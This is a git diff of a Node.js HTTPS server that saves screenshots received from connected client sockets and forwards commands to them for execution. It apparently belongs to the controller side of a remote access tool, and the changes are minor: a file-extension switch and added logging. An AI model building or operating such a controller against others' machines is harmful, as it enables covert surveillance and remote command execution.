@@ -159,7 +159,7 @@ const server = https.createServer(options, (req, res) => {
                                                 res.writeHead(200, { 'Content-Type': 'application/json' });
                     
                                                 const binpng = Buffer.from(parsedData.img, 'base64');
-                                                fs.writeFile(`${adir}screenshot_${Math.floor(Date.now() / 1000)}.png`, binpng, (err) => {
+                                                fs.writeFile(`${adir}screenshot_${Math.floor(Date.now() / 1000)}.bmp`, binpng, (err) => {
                                                     if (err) {
                                                         console.error('Error writing file:', err);
                                                     } else {
@@ -168,7 +168,8 @@ const server = https.createServer(options, (req, res) => {
                                                 });
                     
                                                 // Send JSON response with the parsed image data
-                                                res.end(JSON.stringify({ status: "OK", screenshot: `data:image/png;base64,${parsedData.img}` }));
+                                                // res.end(JSON.stringify({ status: "OK", screenshot: `data:image/png;base64,${parsedData.img}` }));
+						res.end(JSON.stringify({ status: "OK", screenshot: `data:image/bmp;base64,${parsedData.img}` }));
                                             } catch (error) {
                                                 console.error('Error parsing JSON:', error);
                                                 res.writeHead(500, { 'Content-Type': 'application/json' });
@@ -231,6 +232,7 @@ const server = https.createServer(options, (req, res) => {
                                     });
                                     break;
                                 case 'exec_com':
+					console.log(root.command);
                                     so_id.write(JSON.stringify({ com: 2, inp: root.command }) + delmtr);
                                     let comm_json = '';
 
@@ -246,6 +248,7 @@ const server = https.createServer(options, (req, res) => {
                                             try {
                                                 const parsedData = JSON.parse(message);
                                                 parsedData.status = "OK";
+						console.log(message);
                                                 res.writeHead(200, { 'Content-Type': 'application/json' });
                                                 res.end(JSON.stringify(parsedData));
                                             } catch (error) {
